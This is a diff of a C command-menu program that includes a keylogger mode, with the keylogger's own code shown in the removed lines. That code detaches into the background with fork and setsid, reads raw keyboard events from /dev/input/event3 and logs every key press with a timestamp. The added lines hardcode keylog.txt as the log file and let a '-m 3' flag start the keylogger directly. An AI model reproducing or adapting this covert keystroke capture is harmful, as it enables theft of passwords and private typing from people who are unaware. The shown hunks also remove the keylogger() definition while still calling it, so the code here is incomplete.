@@ -6,30 +6,30 @@
 #include <linux/input.h>
 #include <time.h>
 
-// Keylogger function declaration
-void keylogger(const char *logfile);
-
+// Function declarations
 void file_operations_menu();
 void directory_operations_menu();
 void keylogger_operations_menu(int argc, char *argv[]);
+void keylogger(const char *logfile);
 
 int main(int argc, char *argv[]) 
 {
-    int choice = 0;
-
-    // If arguments are passed, parse them
+    // Check if command-line arguments are provided
     if (argc == 3 && strcmp(argv[1], "-m") == 0) {
         int mode = atoi(argv[2]);  // Extract the mode (3 for keylogger)
         
-        // Call the corresponding function based on mode
+        // If keylogger operation mode (3), directly call the keylogger function
         if (mode == 3) {
-            keylogger_operations_menu(argc, argv);  // Call the keylogger operation
+            keylogger_operations_menu(argc, argv);  // Directly call the keylogger operation
+            return 0;  // Exit after running the keylogger
         } else {
             printf("Invalid mode selected!\n");
+            return 1;  // Invalid mode
         }
     } 
     else {
         // If no arguments are passed, show the menu system
+        int choice = 0;
         while (1) {
             printf("\n=== SUPER COMMAND MENU ===\n");
             printf("1. File Operations\n");
@@ -47,7 +47,7 @@ int main(int argc, char *argv[])
                     directory_operations_menu();
                     break;
                 case 3:
-                    keylogger_operations_menu(argc, argv);
+                    keylogger_operations_menu(argc, argv);  // Keylogger operation
                     break;
                 case 0:
                     printf("Exiting program. Goodbye!\n");
@@ -57,6 +57,19 @@ int main(int argc, char *argv[])
             }
         }
     }
+}
+
+// Keylogger menu function (with command-line args support)
+void keylogger_operations_menu(int argc, char *argv[]) {
+    // Hardcoded log file name
+    const char *logfile = "keylog.txt";  // The log file will always be 'keylog.txt'
+
+    // Print message indicating keylogger is starting
+    printf("\n=== Keylogger Operations ===\n");
+    printf("Starting keylogger... Log file: %s\n", logfile);
+
+    // Call the keylogger function with the log file 'keylog.txt'
+    keylogger(logfile);
 }
 
 void file_operations_menu() {
@@ -127,63 +140,5 @@ void directory_operations_menu() {
                 printf("Invalid choice! Please try again.\n");
         }
     }
-}
-
-// Keylogger menu function (with command-line args support)
-void keylogger_operations_menu(int argc, char *argv[]) {
-    if (argc == 3) {
-        char *logfile = argv[2];  // The second parameter is the log file
-        printf("Starting keylogger... Log file: %s\n", logfile);
-        keylogger(logfile);  // Call the keylogger function
-    } else {
-        printf("Error: Log file name missing!\n");
-    }
-}
-
-// Keylogger function implementation
-void keylogger(const char *logfile) {
-    const char *device = "/dev/input/event3";  // Replace with your keyboard's event file
-    struct input_event event;
-
-    pid_t pid = fork();
-    if (pid < 0) {
-        perror("Error forking process");
-        return;
-    }
-    if (pid > 0) {
-        printf("Keylogger running in the background. PID: %d\n", pid);
-        return;
-    }
-
-    setsid();  // Create a new session
-    int fd = open(device, O_RDONLY);
-    if (fd == -1) {
-        perror("Error opening device file");
-        printf("Ensure you have the correct permissions or run as root.\n");
-        exit(EXIT_FAILURE);
-    }
-
-    FILE *log = fopen(logfile, "a");
-    if (!log) {
-        perror("Error opening log file");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
-
-    time_t now = time(NULL);
-    fprintf(log, "Session started: %s\n", ctime(&now));
-    fflush(log);
-
-    while (1) {
-        if (read(fd, &event, sizeof(struct input_event)) > 0) {
-            if (event.type == EV_KEY && event.value == 1) { // Key press event
-                fprintf(log, "Key %d pressed at %ld\n", event.code, time(NULL));
-                fflush(log);
-            }
-        }
-    }
-
-    fclose(log);
-    close(fd);
 }
 
